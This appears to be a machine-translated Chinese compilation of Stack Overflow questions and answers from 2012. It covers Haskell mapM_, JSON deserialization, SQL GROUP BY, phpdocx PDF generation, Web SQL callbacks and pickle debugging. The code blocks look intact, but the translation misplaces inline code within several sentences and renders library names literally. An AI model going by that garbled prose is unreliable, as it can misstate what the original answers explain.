做到这一点的方法是使用`>>`运算符，它将两个 I/O 操作链接在一起（前提是您对它们的结果不感兴趣 - 并且打印一些东西不会返回任何有趣的东西）。所以`foldr (>>) (return ())`将把你的 I/O 动作列表变成一个单一的 I/O 动作。这个函数实际上已经定义好了；它被称为`sequence`。

但是，`map`+`sequence`是一种常见的组合，*它*也已经被定义；它被称为`mapM_`。（如果您想保留结果，还有`mapM`，没有下划线。但打印不会返回任何内容，所以没有必要。）

* * *

现在，这就是为什么`mapM_`有效。现在你问为什么其他几种方法都行不通......

```
x <- [1, 2, 3]
print x 
```

这根本行不通。第一行在列表 monad 中。但第二行在 I/O monad 中。你不能那样做。（你会得到一个相当莫名其妙的类型检查器错误。）我可能应该指出这是 Haskell 所谓的“do-notation”，上面的片段需要`do`前面的关键字才能真正成为有效的语法：

```
do
  x <- [1, 2, 3]
  print x 
```

无论哪种方式，它仍然无法正常工作。它*几乎*做了什么`map print [1, 2, 3]`，但不完全是。（正如我所说，它不会进行类型检查。）

您还建议`[1, 2, 3] >>= print`，这与前面的代码片段相同。（实际上，编译器*将*前者转换为后者。）出于同样的原因，原版不进行类型检查，而本版也不进行类型检查。

这有点像尝试将数字添加到矩阵中。数字是可加的东西。矩阵是可添加的东西。但是您不能将一个添加到另一个，因为它们不一样。如果这是有道理的。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-17T15:34:39.403

你想要的东西不能这样工作，因为你试图将两个单子混合在一起：

```
do x <- [1,2,3]
   print x 
```

具体来说，您正在混合 the`IO`和`[]`monad。在 do-notation 中，所有语句都应该具有`m a`某些 Monad的类型`m`。但是在上面的代码中，第一条语句的类型是 type`[Integer]`而第二条语句的类型是`IO ()`。

要获得您想要的效果，您应该使用`ListT`monad 转换器。[Monad 转换](http://en.wikibooks.org/wiki/Haskell/Monad_transformers)器允许在堆栈中以特定顺序将 monad 混合在一起，并根据需要组合它们的效果。

```
import Control.Monad.Trans
import Control.Monad.Trans.List

value = do x <- ListT (return [1,2,3])
           lift (print x) 
```

这将返回一个类型的值`ListT IO Integer`。要`IO`从此转换器中获取计算，请使用`runListT`. 这将返回一个类型的值`IO [Integer]`。这将输出：

```
GHCI> runListT value
1
2
3
[(),(),()] 
```

这相当于`mapM print [1,2,3]`. 要丢弃列表并获得`mapM_ print [1,2,3]`您可以使用的效果`void`from `Control.Monad`。

```
GHCI> void . runListT $ value
1
2
3 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-17T15:16:30.503

您可以使用按顺序`sequence_`执行操作：`IO`

```
sequence_ $ [1, 2, 3] >>= (\x -> [print x]) 
```

但我认为`mapM_`要清楚得多。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-17T16:03:25.900

我不会准确回答你的问题，因为我认为这个问题本身有点误导。特别是，在这里使用`mapM`或类似*的东西是正确的*。对这个任务使用 do 符号只会让它变得更加复杂，而且我讨厌告诉人们不*应该做的事情*。但我会为您提供一种替代方案，您可能会发现它更容易消化。

如果您来自命令式背景（即您熟悉 C、Java、Python 等），那么您可能会发现它更易于使用，`forM`而不是`mapM`. 语法是

```
forM <list of things> <action to perform for each thing> 
```

即它就像一个for-each 循环！例如：

```
ghci> import Control.Monad
ghci> forM [1,2,3] print
1
2
3
[(),(),()] 
```

事物列表是`[1,2,3]`，每件事要执行的动作是`print`。注意到最后的返回值了吗？那是因为每次调用`print`返回`()`，最后都被收集在一起。如果您不想要使用`forM_`而不是返回值`forM`，如下所示：

```
ghci> forM_ [1,2,3] print
1
2
3 
```

你准备好接受秘密了吗？函数`forM`和`forM_`只是`mapM`并且`mapM_`参数相反，即：

```
forM list action = mapM action list 
```

我经常`forM`在我的代码中使用它，因为它会引起人们对*函数*的关注，而不是你想要的*列表。*当 then 函数跨越多行时，它看起来也更整洁。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-18T11:49:49.877

这可能是对如何工作的最简单的解释`mapM_`：

```
main = foldr1 (>>) (map print [1, 2, 3]) 
```

也就是说，`print`应用于每个列表成员并使用 连接结果`>>`，所以首先你得到

```
main = foldr1 (>>) [print 1, print 2, print 3] 
```

最后你得到

```
main = print 1 >> print 2 >> print 3 
```

更准确的解释是这样的：

```
main = foldr (>>) (return ()) (map print [1, 2, 3]) 
```

所以最后你得到

```
main = print 1 >> print 2 >> print 3 >> return () 
```

该`return ()`部分让函数使用空列表 -`foldr1`只是以相同的方式在空列表上崩溃`head`并`tail`执行。

# python - JSON 提取到 CSV

> ID：12461873
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:52:52.620
> 
> 标签：python, json, csv

我在一个大型 JSON 文件的每一行中有多个嵌套的数据项。

JSON 文件中的一行示例：{“Key1”:{“Key2”:”value2”},{“Key3”:{“Key4:”Value4”}}}}

该文件大小接近 2GB，我需要将其转换为 CSV。

因此，这里有两个主要问题：

1.  如何以 2d CSV 格式表示 n 维数据？
2.  即使我想出了一种方法来表示 CSV 中的数据，我如何将它从 JSON 转换？

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:57:50.543

1/ 这是个问题。这实际上取决于文件的结构。在这种情况下，您可以使用 3 列，例如

```
firstKey secondKey value
Key1     Key2      value2
Key3     Key4      value4 
```

但这也可能非常不同

2/ 你需要一个流解析方法。很可能您的整个 json 结构不适合内存

# .net - JSON 无法正确反序列化 Web API

> ID：12461875
> 
> 赞同：1
> 
> 时间：2012-09-17T14:52:59.383
> 
> 标签：.net, json, entity-framework, asp.net-web-api

将 JSON 转换为对象时出现错误。我可以通过 Fiddler 获取 JSON，所以我猜我的 Web API 没有问题。

这是我遇到的错误：

> {"无法将当前 JSON 对象 (例如 {\"name\":\"value\"}) 反序列化为类型 'System.Collections.Generic.List`1[MvcMobile.WebAPI.Model.Person]' 因为该类型需要要正确反序列化的 JSON 数组（例如 [1,2,3]）。\r\n要修复此错误，请将 JSON 更改为 JSON 数组（例如 [1,2,3]）或更改反序列化的类型以使其是可以从 JSON 对象反序列化的普通 .NET 类型（例如，不是像整数这样的原始类型，不是像数组或列表这样的集合类型）。也可以将 JsonObjectAttribute 添加到该类型以强制它从 JSON 反序列化对象。\r\n路径 'BusinessEntityID'，第 1 行，位置 30。"}

这是 JSON：

```
{"$id":"1", "BusinessEntityID":1,"PersonType":"EM","NameStyle":false,"Title":null,
"FirstName":"Ken", "MiddleName":"J","LastName":"Sánchez","Suffix":null,
"EmailPromotion":0,"AdditionalContactInfo":null,"Demographics":"0",
"rowguid":"92c4279f-1207-48a3-8448-4636514eb7e2",
"ModifiedDate":"2003-02-    08T00:00:00","Employee":null} 
```

这是代码：

```
HttpResponseMessage resp = client.GetAsync("http://localhost:8080/api/person/GetPerson/" + id).Result;
resp.EnsureSuccessStatusCode();

var result = resp.Content.ReadAsAsync<IEnumerable<Person>>().Result; 
```

在实体框架中，我设置了以下两个选项：

```
this.Configuration.LazyLoadingEnabled = false; 
this.Configuration.ProxyCreationEnabled = false; 
```

难道是因为我只取回了一个 JSON 有问题的实体吗？或者缺少 []{} 的东西？或者也许他们是从 JSON 到对象的更好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:57:04.660

原因是您正在调用 /api/person/GetPerson/1 （即您期待一个结果）。

如果您正在调用 /api/person/all - 那么您将使用 IEnumerable 因为您期望多个结果。

此外 - 可能值得删除 URI 的 GetPerson 部分 - 它是 REST，因此 api/person/id 是足够的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:56:59.323

似乎错误消息很容易解释。无论您尝试反序列化到哪个类都需要一个数组。您的 JSON 只是一个对象。您可以尝试在其周围放置方括号以使其成为单项数组。

像这样的东西：

```
[{"$id":"1", "BusinessEntityID":1,"PersonType":"EM","NameStyle":false,"Title":null,
"FirstName":"Ken", "MiddleName":"J","LastName":"Sánchez","Suffix":null,
"EmailPromotion":0,"AdditionalContactInfo":null,"Demographics":"0",
"rowguid":"92c4279f-1207-48a3-8448-4636514eb7e2",
"ModifiedDate":"2003-02-    08T00:00:00","Employee":null}] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-20T10:09:49.820

我将代码更改为，它对我有用。

```
var result = resp.Content.ReadAsAsync<Person>().Result; 
```

# php - 如何将 str.replace 与函数转移一起使用

> ID：12461881
> 
> 赞同：0
> 
> 时间：2012-09-17T14:53:17.797
> 
> 标签：php, jquery, forms

再会。我使用此代码将值从一个输入复制到另一个：

```
<script type = "text/javascript">
function transfer(which) {
document.getElementById("temp_name").value = which;
}
</script>
<form action="register.php" method="post" name="register">
<input type="text" name="username" id = "username" onkeyup = "transfer(this.value)"><br>
<input type="text" name="temp_name" id = "temp_name">
</form> 
```

这个重复的#username 到#temp_name 但我需要添加的文本#temp_name 没有额外的连字符和小写。所以我需要以某种方式将此代码添加到上层代码中：

```
.replace(/\s/g,'-'); // to replace spaces with hypens
tmp_str = tmp_str.replace(/[\-]+/g,'-');    // to remove extra hypens
tmp_str = tmp_str.replace(/[^a-zA-Z0-9\-]/g,'').toLowerCase(); // to convert to lower case and only allow alpabets and number and hypehn
tmp_str = alltrimhyphen(tmp_str); 
```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:58:48.777

简单的解决方案，只需像这样替换`tmp_str`：`which`

```
<script type="text/javascript">
    function transfer(which) {
        which = which.replace(/\s/g,'-'); // to replace spaces with hypens
        which = which.replace(/[\-]+/g,'-');    // to remove extra hypens
        which = which.replace(/[^a-zA-Z0-9\-]/g,'').toLowerCase(); // to convert to lower case 
        document.getElementById("temp_name").value = which;
   }
</script>

<form action="register.php" method="post" name="register">
    <input type="text" name="username" id="username" onkeyup="javascript:transfer(this.value);">
    <br />
    <input type="text" name="temp_name" id="temp_name">
</form> 
```

# php - 使用 PHP Docx 将 DOCX 转换为 PDF - 存储而不是流式传输到浏览器

> ID：12461884
> 
> 赞同：2
> 
> 时间：2012-09-17T14:53:36.957
> 
> 标签：php, pdf, docx, file-conversion

我的一个项目需要将 DOCX 转换为 PDF。我遇到了[phpdocx](http://www.phpdocx.com/)项目，一切都转换得很好，但是它将文件提供给浏览器，在转换后提示用户下载。我需要保留文件，只需读取 MySQL 存储的数据。有任何想法吗？

这是我正在使用的代码：

```
$docx = new TransformDoc();
$docx ->setStrFile($tmpName);
$docx ->generatePDF(); 
```

使用以下 Tim 的修改会产生以下错误：

```
i
Warning: session_start() [function.session-start]:
Cannot send session cache limiter - headers already sent
(output started at /home/zbtech/public_html/DocCon/classes/TransformDoc.inc:1)
in /home/zbtech/public_html/scribpub.php on line 5

Unable to generate PDF file string. exception 'DOMPDF_Exception' with message
'Unknown image type: files/files_/tmp/phpNQFatu/media/word/.'

in /home/zbtech/public_html/DocCon/pdf/include/image_cache.cls.php:175 Stack trace:

#0 /home/zbtech/public_html/DocCon/pdf/include/image_frame_decorator.cls.php(88): 
Image_Cache::resolve_url('files/files_/tm...', NULL, '', '')

#1 /home/zbtech/public_html/DocCon/pdf/include/frame_factory.cls.php(173): Image_Frame_Decorator-
>__construct(Object(Frame), Object(DOMPDF)) 

#2 /home/zbtech/public_html/DocCon/pdf/include/dompdf.cls.php(499): Frame_Factory::decorate_frame
(Object(Frame), Object(DOMPDF)) #3 /home/zbtech/public_html/DocCon/classes/TransformDoc.inc
(282): DOMPDF->render() #4 /home/zbtech/public_html/scribpub.php(68): TransformDoc->generatePDF

() #5 {main} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T15:12:29.400

这就是我要做的。

phpdocx 库执行此操作以将 pdf 流式传输到浏览器。

它位于第 275 行或附近的 classes/TransformDoc.inc 中（截至 2012 年 9 月 17 日下载的版本）

```
public function generatePDF()
{
    $this->generateXHTML();
    $this->cleanXHTML();
    try {
        $domPDF = new DOMPDF();
        $domPDF->load_html($this->_xhtml);
        $domPDF->render();
        $fileName = $this->getFileName() . '.pdf';
        $domPDF->stream($fileName);
    }
    catch (Exception $err) {
        echo 'Unable to generate PDF file. ';
        echo $err;
    }
} 
```

查看源代码表明您可以编写自己的函数来执行类似的操作。这是基于上述函数的未经测试的示例函数。

```
/**
 * Convert DOCX to PDF, using dompdf. DOCX->XHTML->PDF and returns in a string
 *
 * @access public
 */
public function generatePDF()
{
    $this->generateXHTML();
    $this->cleanXHTML();
    try {
        $domPDF = new DOMPDF();
        $domPDF->load_html($this->_xhtml);
        $domPDF->render();
        $out = $domPDF->output();
    }
    catch (Exception $err) {
        echo 'Unable to generate PDF file string. ';
        echo $err;
    }

    return $out;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T16:56:37.750

如果您在 PHP Docx 文件中搜索“未知图像类型：”，您会在 pdf/include/image_cache.cls.php 中找到它。

```
// line 81
static function resolve_url($url, $proto, $host, $base_path) {
...
// line 168
$resolved_url = build_url($proto, $host, $base_path, $url);
if ($DEBUGPNG) print 'build_url('.$proto.','.$host.','.$base_path.','.$url.')('.$resolved_url.')';

if ( !preg_match("/.*\.(\w+)/",$url,$match) ) {
    //debugpng
    if ($DEBUGPNG) print '[resolve_url exception '.$url.']';
      throw new DOMPDF_Exception("Unknown image type: $url.");
    }
    .... 
```

代码抛出此错误，因为它无法在 url 上找到扩展来猜测图像类型。我不知道为什么使用 ->output 方法的新代码而不是原始代码会发生这种情况 - 你会认为无论我们使用哪种方式生成 pdf 都会起作用。

现在有两个选择：注释掉（或删除）上面引用的 throw new DOMPDF_Exception 行，或者使用原始函数的输出缓冲。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-19T00:30:55.350

实现此目的的一种明确方法是编辑提供的文件：

**/phpdocx/examples/easy/createPDF.php**

```
public function generatePDF($outputFileName)
{
    $this->generateXHTML();
    $this->cleanXHTML();
    try {
        $domPDF = new DOMPDF();
        $domPDF->load_html($this->_xhtml);
        $domPDF->render();
        //
        // ADD THIS: (dont forget the outputFileName method argument)
        //
        $handler = fopen($outputFileName,'w');
        fwrite($handler, $domPDF->output());
        fclose($handler);
    }
    catch (Exception $err) {
        echo 'Unable to generate PDF file string. ';
        echo $err;
    }

    return $out;
} 
```

# java - 将数据从jsp传递到控制器

> ID：12461885
> 
> 赞同：0
> 
> 时间：2012-09-17T14:53:42.110
> 
> 标签：java, spring, jsp, spring-mvc

我有一个供用户输入小狗信息的jsp。

```
<FORM  action="/publish" method="post" commandName="puppy" >
    <table border=0 cellspacing=0 cellpadding="0">
       <% String[] textFields = {"category", "name", "gender", "age", "price"};
            for (int j= 0; j<textFields.length; j++){      %>
            <tr>  <td> <%=textFields[j]%>:                        </td>
                  <td> <input type=text name=<%=textFields[j]%>>  </td>
            </tr>
           <% } %>
    </table>
    <input type = "submit" value="submit">
</FORM> 
```

我有一个包含类别、名称、性别、年龄、价格的小狗对象。

在控制器中，我想获取用户写入的小狗信息

```
@RequestMapping(value = "/publish")
public String publish (@ModelAttribute("puppy") Puppy newP, BindingResult result){
        System.out.println("Puppyname: " + newP.getName());
        return "redirect:publish.jsp";
} 
```

这不起作用。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:02:26.890

Spring 3.1+ RedirectAttributes（又名 FlashAttributes）是你的朋友。

带有示例的随机博客链接[http://vard-lokkur.blogspot.co.uk/2012/02/spring-mvc-flash-attributes.html](http://vard-lokkur.blogspot.co.uk/2012/02/spring-mvc-flash-attributes.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:04:40.463

您必须使用 Spring MVC 标签库。在表单中为`Puppy`类的每个属性输入一个输入，例如：

```
<s:input  path="name" /> 
```

显然，您的类中必须有`category`, `name`, `gender`, `age`,`price`属性`Puppy`以及它们的公共访问器。

# java - SQL COUNT 显示的不仅仅是计数？

> ID：12461888
> 
> 赞同：1
> 
> 时间：2012-09-17T14:53:45.867
> 
> 标签：java, sql

我有很多板球碗的数据库。架构是：

```
Player(PlayerID, Initials, Surname)
 - Stores all the players
Bowl(BowlID, Striker, Non-Striker, Bowler, Runs)
 - Stores info for every ball
Team(TeamID, name)
 - Stores all the teams
SquadPlayer(TeamID, PlayerID, MatchID)
 - Stores a record of who was playing at each match and for which team 
```

我试图找出英格兰队中每位球员的六分球数。（我使用的是 openoffice 风格的 HSQL）

```
SELECT "Player"."Initials", "Player"."Surname", COUNT ("Bowl"."Striker") AS "No. Sixes"
FROM "Bowl", "Player", "Player" AS "Bowler"
WHERE "Bowl"."Striker" = "Player"."PlayerID"
AND "Bowl"."Bowler" = "Bowler"."PlayerID"
AND "Bowl"."Striker" IN (
    SELECT DISTINCT "Player"."PlayerID" 
    FROM "Player", "Team", "SquadPlayer"
    WHERE "Player"."PlayerID" = "SquadPlayer"."PlayerID" 
    AND "Team"."TeamID" = "SquadPlayer"."TeamID" 
    AND "Team"."Name" = 'England' )
AND "Bowl"."Runs" = '6'
GROUP BY "Bowl"."Striker" 
```

这是我试图运行的 SQL，但它不起作用。如果我省略了 SELECT 部分的前两列（Player.Initials 和 Player.Surname），它可以正常工作，但它不是很有用，因为我无法计算出 WHO 的所有六分之一。

我通过java运行它，我得到了异常：

```
java.sql.SQLException: Not in aggregate function or group by clause 
```

那么为什么这不起作用呢？以及如何在旁边显示名称？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:57:02.307

当您的 select 子句中有一个计数（或任何聚合函数）时，select-clause 中的所有未聚合列也必须出现在 group-by 子句中。

让你的 group by-clause 看起来像这样：

```
GROUP BY "Bowl"."Striker", "Player"."Initials", "Player"."Surname" 
```

它应该工作..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T15:02:48.627

如果您在查询中使用 count、sum 等（聚合函数），则您检索到的所有未在聚合中的列都必须在 group by 子句中。

将您的 group by 子句更改为

```
GROUP BY  "Player"."Initials", "Player"."Surname" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:56:30.490

子句中的任何字段都`SELECT`需要带有聚合函数或包含在`GROUP BY`子句中，这就是您收到此错误的原因。因此，您必须`"Player"."Initials", "Player"."Surname"`在`GROUP BY`子句中包含 或对它们使用聚合函数。就像是：

```
SELECT "Player"."Initials", "Player"."Surname", 
      COUNT ("Bowl"."Striker") AS "No. Sixes"
FROM "Bowl", "Player", "Player" AS "Bowler"
WHERE "Bowl"."Striker" = "Player"."PlayerID"
AND "Bowl"."Bowler" = "Bowler"."PlayerID"
AND "Bowl"."Striker" IN (
    SELECT DISTINCT "Player"."PlayerID" 
    FROM "Player", "Team", "SquadPlayer"
    WHERE "Player"."PlayerID" = "SquadPlayer"."PlayerID" 
    AND "Team"."TeamID" = "SquadPlayer"."TeamID" 
    AND "Team"."Name" = 'England' )
AND "Bowl"."Runs" = '6'
GROUP BY "Bowl"."Striker", "Player"."Initials", "Player"."Surname" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:56:33.753

您的分组依据应该是您未汇总的列。

```
SELECT "Player"."Initials", "Player"."Surname", COUNT ("Bowl"."Striker") AS "No. Sixes"
FROM "Bowl", "Player", "Player" AS "Bowler"
WHERE "Bowl"."Striker" = "Player"."PlayerID"
AND "Bowl"."Bowler" = "Bowler"."PlayerID"
AND "Bowl"."Striker" IN (
    SELECT DISTINCT "Player"."PlayerID" 
    FROM "Player", "Team", "SquadPlayer"
    WHERE "Player"."PlayerID" = "SquadPlayer"."PlayerID" 
    AND "Team"."TeamID" = "SquadPlayer"."TeamID" 
    AND "Team"."Name" = 'England' )
AND "Bowl"."Runs" = '6'
GROUP BY "Player"."Initials", "Player"."Surname" 
```

# jquery - 超级鱼的多个实例？

> ID：12461890
> 
> 赞同：1
> 
> 时间：2012-09-17T14:53:50.613
> 
> 标签：jquery, html, css, superfish

我可以在一个 HTML 页面上运行两个 superfish 实例吗？我没有使用 CMS，只是直接使用 HTML、CSS 和 JavaScript。我想这与编辑 superfish.css 文件有关，但我想不通。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:15:45.867

是的，您可以，您所要做的就是给它们单独的 ID 并像这样初始化它们：

```
$("#menu-1, #menu-2").superfish(); 
```

# eclipse - 如何在 Eclipes 中向 Runnable Jar 添加自定义启动画面

> ID：12461894
> 
> 赞同：1
> 
> 时间：2012-09-17T14:53:56.493
> 
> 标签：eclipse, manifest, splash-screen, executable-jar

所以我有一个闪屏，我想将它添加到我使用 Eclipse 创建的可运行 jar 文件中。

现在我能做到这一点的唯一方法是创建 Jar 并使用 WinRar 手动进入 jar 文件并编辑 MANIFEST.MF 文件以指向屏幕截图。

我只是想知道是否有更简单的方法来添加启动画面或给 Eclipse 一个自定义清单文件以用于创建 Runnable Jar

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:00:39.437

在这里查看[这个问题](https://stackoverflow.com/questions/7533403/how-to-set-splashscreen-in-eclipse)（答案的直接链接：[branding your application](http://www.eclipse.org/articles/Article-Branding/branding-your-application.html)）。您可以在此处找到其他信息：[如何创建启动画面](http://docs.oracle.com/javase/tutorial/uiswing/misc/splashscreen.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-21T09:24:40.840

`MANIFEST.MF`如果您使用 General > Export as JAR，则可以使用自定义

但是，我自己不知道如何配置 Eclipse，以便它自动将其添加到生成的 MANIFEST 文件中。

# javascript - 使函数调用等待 Web SQL 查询

> ID：12461896
> 
> 赞同：6
> 
> 时间：2012-09-17T14:53:58.143
> 
> 标签：javascript, callback, web-sql

无论传递的数字是否为素数，Primecheck 函数都应该返回 true 或 false。如果数字是素数，函数将其添加到 PRIMES 表中。这是一个埃拉托色尼筛算法，但还没有完成。

```
function primecheck (number) {
    var isprime = true;
        if (number%10 == 1 || number%10 == 3 || number%10 == 7 || number%10 == 9) {
        db.transaction(function (tx) {
            tx.executeSql('SELECT * from Primes', [], function (tx, result) {
                for (var i = 1; i < result.rows.length; i++) {
                    if (number%result.rows.item(i)['prime'] == 0) {
                        isprime = false;
                        break;
                    }
                }
                if (isprime) {
                    tx.executeSql('INSERT INTO PRIMES (prime) values (?)', [number]);
                }
                return isprime;
            }, null);
        }, null, null);

    }
    else {
        isprime = false;
        return isprime;
    }
} 
```

**问题：**当我传递不以 1、3、7、9 结尾的数字时，函数返回 true，没关系。但是当我传递其他数字时，函数返回未定义。我想这是因为函数调用不会“等待”SQL 查询完成，所以我必须使用某种回调函数。但它没有用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T15:55:13.120

如果您的函数执行异步操作，则它无法根据这些异步操作的结果返回值。（这是因为由于 JavaScript 的单线程特性，异步函数在当前执行完成之前不会运行。）相反，您的函数应该期望一个回调函数，该函数将可能的返回值作为参数。

您当前调用您的函数，如：

```
var isprime = primecheck(someNum);
// now do something with isprime 
```

但是您需要使用回调：

```
primecheck(someNum, function(isprime) {
    // now do something with isprime
}); 
```

只需添加第二个回调参数，然后调用该回调而不是使用`return`：

```
function primecheck (number, callback) {
    var isprime = true;
        if (number%10 == 1 || number%10 == 3 || number%10 == 7 || number%10 == 9) {
        db.transaction(function (tx) {
            tx.executeSql('SELECT * from Primes', [], function (tx, result) {
                //....
                callback(isprime);
            }, null);
        }, null, null);
    }
    else {
        isprime = false;
        callback(isprime);
    }
} 
```

现在，什么都不返回，但是只要确定输入的素数，`primecheck`您传入的回调函数就会作为其第一个参数`primecheck`被触发。`isprime``primecheck`

# wpf - 在 ESRI.ArcGIS.Mobile.WPF 上画一个点

> ID：12461899
> 
> 赞同：1
> 
> 时间：2012-09-17T14:54:04.897
> 
> 标签：wpf, arcgis, esri

我正在使用 ESRI.ArcGIS.Mobile.WPF dll 来访问地图。

使用 MapDoubleClick 事件给我 X 和 Y 坐标。我需要帮助根据从双击事件获得的 X 和 Y 坐标在地图上绘制一个点。我看到必须使用 Map.Invalidate() 但 ArcGis Mobile for WPF 没有 Invalidate()

# python - 调试泡菜

> ID：12461901
> 
> 赞同：9
> 
> 时间：2012-09-17T14:54:10.817
> 
> 标签：python, pickle, python-3.2

我试图腌制一个相当复杂的对象层次结构并得到异常：

```
pickle.PicklingError: Can't pickle <class 'function'>: attribute lookup builtins.function failed 
```

是否有任何合理的方法可以用来测试对象层次结构的可挑选性？我的目标是找到违规功能的位置

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-10-14T15:41:51.100

为此，我会使用[dill](https://github.com/uqfoundation/dill)，它可以在 python 中序列化几乎任何东西。Dill 还提供[了一些很好的工具](https://github.com/uqfoundation/dill/blob/master/dill/detect.py)，可以帮助您了解在代码失败时导致酸洗失败的原因。

```
>>> import dill
>>> dill.loads(dill.dumps(your_bad_object))
>>> ...
>>> # if you get a pickling error, use dill's tools to figure out a workaround
>>> dill.detect.badobjects(your_bad_object, depth=0)
>>> dill.detect.badobjects(your_bad_object, depth=1)
>>> ... 
```

如果您绝对想要，您可以使用 dill `badobjects`（或其他检测函数之一）递归地潜入对象的引用链，并弹出不可腌制的对象，而不是像上面那样在每个深度调用它。

此外，[objgraph](http://mg.pov.lt/objgraph/)也是对测试套件的一个非常方便的补充。

```
>>> # visualize the references in your bad objects
>>> objgraph.show_refs(your_bad_object, filename='your_bad_object.png') 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-13T10:48:24.273

我这样做了，它在很多时候都对我有用......一旦我发现一些完全万无一失的东西，我会更新这个

它会进行一堆打印，然后如果有一个要引发异常则引发异常，这样您就可以看到对象层次结构的哪一部分导致了问题。

```
def test_pickle(xThing,lTested = []):
    import pickle
    if id(xThing) in lTested:
        return lTested
    sType = type(xThing).__name__
    print('Testing {0}...'.format(sType))

    if sType in ['type','int','str']:
        print('...too easy')
        return lTested
    if sType == 'dict':
        print('...testing members')
        for k in xThing:
            lTested = Pickalable.test_pickle(xThing[k],lTested)
        print('...tested members')
        return lTested
    if sType == 'list':
        print('...testing members')
        for x in xThing:
            lTested = Pickalable.test_pickle(x)
        print('...tested members')
        return lTested

    lTested.append(id(xThing))
    oClass = type(xThing)

    for s in dir(xThing):
        if s.startswith('_'):
            print('...skipping *private* thingy')
            continue
        #if it is an attribute: Skip it
        try:
            xClassAttribute = oClass.__getattribute__(oClass,s)
        except AttributeError:
            pass
        else:
            if type(xClassAttribute).__name__ == 'property':
                print('...skipping property')
                continue

        xAttribute = xThing.__getattribute__(s)
        print('Testing {0}.{1} of type {2}'.format(sType,s,type(xAttribute).__name__))
        #if it is a function make sure it is stuck to the class...
        if type(xAttribute).__name__ == 'function':
            raise Exception('ERROR: found a function')
        if type(xAttribute).__name__ == 'method':
            print('...skipping method')
            continue
        if type(xAttribute).__name__ == 'HtmlElement':
            continue
        if type(xAttribute) == dict:
            print('...testing dict values for {0}.{1}'.format(sType,s))
            for k in xAttribute:
                lTested = Pickalable.test_pickle(xAttribute[k])
                continue
            print('...finished testing dict values for {0}.{1}'.format(sType,s))

        try:
            oIter = xAttribute.__iter__()
        except AttributeError:
            pass
        except AssertionError:
            pass #lxml elements do this
        else:
            print('...testing iter values for {0}.{1} of type {2}'.format(sType,s,type(xAttribute).__name__))
            for x in xAttribute:   
                lTested = Pickalable.test_pickle(x,lTested)
            print('...finished testing iter values for {0}.{1}'.format(sType,s))

        try:
            xAttribute.__dict__
        except AttributeError:
            pass
        else:
            #this attribute should be explored seperately...
            lTested = Pickalable.test_pickle(xAttribute,lTested)
            continue
        pickle.dumps(xAttribute)

    print('Testing {0} as complete object'.format(sType))
    pickle.dumps(xThing)
    return lTested 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-26T17:59:38.560

这是@Sheena 代码的稍微调整的版本，它也适用于 python 2 和一些其他类型：

```
def test_pickle(xThing, lTested = []):
    import pickle
    if id(xThing) in lTested:
        return lTested
    sType = type(xThing).__name__
    print('Testing {0}...'.format(sType))

    if sType in ['type','int','str', 'bool', 'NoneType', 'unicode']:
        print('...too easy')
        return lTested
    if sType == 'dict':
        print('...testing members')
        for k in xThing:
            lTested = test_pickle(xThing[k],lTested)
        print('...tested members')
        return lTested
    if sType == 'list':
        print('...testing members')
        for x in xThing:
            lTested = test_pickle(x)
        print('...tested members')
        return lTested

    lTested.append(id(xThing))
    oClass = type(xThing)

    for s in dir(xThing):
        if s.startswith('_'):
            print('...skipping *private* thingy')
            continue
        #if it is an attribute: Skip it
        try:
            xClassAttribute = oClass.__getattribute__(oClass,s)
        except (AttributeError, TypeError):
            pass
        else:
            if type(xClassAttribute).__name__ == 'property':
                print('...skipping property')
                continue

        xAttribute = xThing.__getattribute__(s)
        print('Testing {0}.{1} of type {2}'.format(sType,s,type(xAttribute).__name__))
        if type(xAttribute).__name__ == 'function':
            print("...skipping function")
            continue
        if type(xAttribute).__name__ in ['method', 'instancemethod']:
            print('...skipping method')
            continue
        if type(xAttribute).__name__ == 'HtmlElement':
            continue
        if type(xAttribute) == dict:
            print('...testing dict values for {0}.{1}'.format(sType,s))
            for k in xAttribute:
                lTested = test_pickle(xAttribute[k])
                continue
            print('...finished testing dict values for {0}.{1}'.format(sType,s))

        try:
            oIter = xAttribute.__iter__()
        except (AttributeError, TypeError):
            pass
        except AssertionError:
            pass #lxml elements do this
        else:
            print('...testing iter values for {0}.{1} of type {2}'.format(sType,s,type(xAttribute).__name__))
            for x in xAttribute:
                lTested = test_pickle(x,lTested)
            print('...finished testing iter values for {0}.{1}'.format(sType,s))

        try:
            xAttribute.__dict__
        except AttributeError:
            pass
        else:
            #this attribute should be explored seperately...
            lTested = test_pickle(xAttribute,lTested)
            continue
        print(0, xThing, xAttribute)
        pickle.dumps(xAttribute)

    print('Testing {0} as complete object'.format(sType))
    pickle.dumps(xThing)
    return lTested 
```

`dill`我发现这是最有用的选择（在没有泡菜的地方也更宽容）。你可以简单地运行它

```
test_pickle(my_complex_object)
print("Done!") 
```

